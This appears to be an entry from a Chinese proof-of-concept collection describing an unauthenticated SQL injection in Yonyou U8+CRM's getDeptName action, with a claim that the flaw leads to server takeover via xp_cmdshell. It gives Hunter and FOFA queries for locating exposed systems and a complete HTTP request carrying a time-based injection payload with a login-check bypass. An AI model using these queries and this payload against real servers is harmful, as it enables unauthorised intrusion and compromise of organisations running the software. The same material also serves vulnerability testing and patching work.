## 用友U8-CRM系统getDeptName存在SQL注入漏洞

用友U8+CRM系统getDeptName存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## hunter

```jade
app.name="用友 CRM"
```

## fofa

```jade
title="用友U8CRM"
```

## poc

```javascript
POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

userid=1%27;WAITFOR+DELAY+%270:0:5%27--
```

![image-20241206220645156](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412062206241.png)